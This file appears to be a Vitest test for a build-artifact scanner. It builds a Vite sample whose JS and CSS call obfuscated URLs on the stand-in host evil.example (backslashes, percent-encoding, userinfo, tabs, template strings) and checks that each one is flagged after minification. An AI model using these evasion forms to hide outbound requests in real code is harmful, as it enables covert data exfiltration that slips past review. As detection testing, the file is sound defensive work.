// 产物扫描对压缩之后的真实产物有效（复验 RA2）：用仓库的 Vite 构建一个小样例，再扫描构建产物。
// 手写的样例容易与压缩器的输出不同（压缩器把普通字符串写成模板字符串，样式里的引号也会去掉），这里以构建出来的为准
import { mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { build } from 'vite'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { scanArtifacts } from './artifacts.ts'
import { ARTIFACT_POLICY } from './policy.ts'

/** 每一处地址的路径都不同，按路径核对每一处都报出 */
const JS_CASES: Readonly<Record<string, string>> = {
  'leading-space': '" //evil.example/leading-space"',
  'backslashes': '"\\\\\\\\evil.example/backslashes"',
  'https-backslashes': '"https:\\\\\\\\evil.example/https-backslashes"',
  'userinfo': '"//u@evil.example/userinfo"',
  'percent': '"//%65vil.example/percent"',
  'ws': '"wss:evil.example/ws"',
  'tab': '"/\\t/evil.example/tab"',
  'single-label': '"//intranet/single-label"',
  // 样例的源码里的模板字符串，不是要插值
  // eslint-disable-next-line no-template-curly-in-string
  'interpolated': '` //evil.example/interpolated/${tail}`',
}

const SOURCES: Readonly<Record<string, string>> = {
  'index.html': '<!doctype html><html><head><link rel="stylesheet" href="./style.css"></head><body><script type="module" src="./main.js"></script></body></html>',
  'main.js': `export function send(tail) {\n${Object.values(JS_CASES).map(value => `  fetch(${value})`).join('\n')}\n}\nsend(location.hash)\n`,
  'style.css': '.a{background-image:image-set(" //evil.example/css-image-set.png" 1x)}.b{background:url( "//evil.example/css-quoted.png")}\n',
}

let root: string
let files: { path: string, content: string }[]

beforeAll(async () => {
  root = mkdtempSync(join(tmpdir(), 'nerve-artifacts-build-'))
  for (const [name, content] of Object.entries(SOURCES))
    writeFileSync(join(root, name), content)
  const outDir = join(root, 'dist')
  await build({ configFile: false, root, logLevel: 'silent', build: { outDir, emptyOutDir: true, target: 'es2022', modulePreload: { polyfill: false } } })
  files = readdirSync(outDir, { recursive: true, withFileTypes: true })
    .filter(entry => entry.isFile() && /\.(?:js|css|html)$/.test(entry.name))
    .map(entry => ({ path: join(entry.parentPath, entry.name).slice(outDir.length + 1), content: readFileSync(join(entry.parentPath, entry.name), 'utf8') }))
}, 60_000)

afterAll(() => {
  rmSync(root, { recursive: true, force: true })
})

describe('US-M1-11 A01 产物扫描：经 Vite 构建、压缩之后的产物（复验 RA2）', () => {
  it('压缩器改了写法（字符串写成模板字符串、样式去掉引号）：每一处跨源地址都报出', () => {
    const { violations } = scanArtifacts(files, ARTIFACT_POLICY)
    // 说明的第一段是报出的地址，之后是原文的上下文
    const reported = violations.filter(v => v.rule === 'artifacts/address').map(v => v.detail.split(' ')[0] ?? '')
    for (const name of Object.keys(JS_CASES))
      expect(reported.filter(detail => detail.includes(`/${name}`)), name).toHaveLength(1)
    for (const name of ['css-image-set', 'css-quoted'])
      expect(reported.some(detail => detail.includes(`/${name}.png`)), name).toBe(true)
  })

  it('样例确实经过了压缩器：JS 里的字符串被写成模板字符串', () => {
    const script = files.find(file => file.path.endsWith('.js'))?.content ?? ''
    expect(script).toContain('` //evil.example/leading-space`')
  })
})
